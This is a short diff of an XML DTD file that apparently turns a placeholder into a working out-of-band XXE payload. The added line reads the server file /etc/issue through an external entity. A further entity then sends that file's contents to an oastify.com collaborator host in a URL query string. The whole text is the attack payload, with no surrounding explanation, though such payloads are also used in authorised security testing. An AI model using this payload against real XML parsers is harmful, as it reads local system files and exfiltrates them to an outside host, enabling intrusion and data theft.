@@ -1,4 +1,4 @@
-<!ENTITY % file "123">
+<!ENTITY % file SYSTEM "file:///etc/issue">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://9jtnfcm2fqoqmwdiaicxf5wgi7oycp6dv.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
